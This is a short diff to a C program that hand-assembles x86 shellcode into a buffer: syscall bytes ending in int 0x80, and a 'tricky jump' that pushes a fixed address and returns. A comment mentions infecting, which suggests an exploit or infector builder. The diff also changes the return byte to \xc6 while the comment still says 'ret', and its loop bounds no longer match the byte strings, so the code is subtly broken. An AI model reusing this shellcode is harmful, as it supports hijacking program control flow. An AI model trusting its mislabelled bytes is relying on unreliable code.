@@ -17,8 +17,11 @@ int main() {
                      "\xcd\x80" // int 0x80
                      "\xc3"; // ret
 
-    for (int i = 0; i < 24; i++) {
+    for (int i = 0; i < 23; i++) {
         buffer[1102 + i] = syscall[i];
+        // print the binary
+        printf("%02x", (unsigned char)syscall[i]);
+        printf("\n");
     }
 
     // string
@@ -29,9 +32,10 @@ int main() {
 
     // tricky jump
     char * jump = "\x68\x4e\x84\x04\x08" // push 0x0804844e
-                  "\xc3"; // ret
-    for (int i = 0; i < 5; i++) {
+                  "\xc6"; // ret
+    for (int i = 0; i < 6; i++) {
         buffer[1171 + i] = jump[i];
+        printf("%02x", (unsigned char)jump[i]);
     }
 
     // read infect to edit
